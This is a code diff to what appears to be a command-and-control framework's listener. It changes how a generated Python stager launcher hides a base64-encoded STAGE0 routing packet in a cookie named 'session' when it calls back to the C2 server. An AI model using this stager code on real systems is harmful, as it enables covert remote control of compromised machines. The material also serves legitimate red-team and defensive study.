@@ -450,11 +450,15 @@ class Listener(object):
                                                              meta='STAGE0', additional='None', encData='')
                 b64RoutingPacket = base64.b64encode(routingPacket)
                 
+                #launcherBase += "req=urllib2.Request(server+t);\n"
+                ## add the RC4 packet to a cookie
+                #launcherBase += "req.add_header('User-Agent',UA);\n"
+                #launcherBase += "req.add_header('Cookie',\"%s=%s\");\n" % (cookie, b64RoutingPacket)
+
                 launcherBase += "req=urllib2.Request(server+t);\n"
                 # add the RC4 packet to a cookie
-                launcherBase += "req.add_header('User-Agent',UA);\n"
-                launcherBase += "req.add_header('Cookie',\"%s=%s\");\n" % (cookie, b64RoutingPacket)
-                
+                launcherBase += "o.addheaders=[('User-Agent',UA), (\"Cookie\", \"session=%s\")];\n" % (b64RoutingPacket)
+
                 # Add custom headers if any
                 if customHeaders != []:
                     for header in customHeaders:
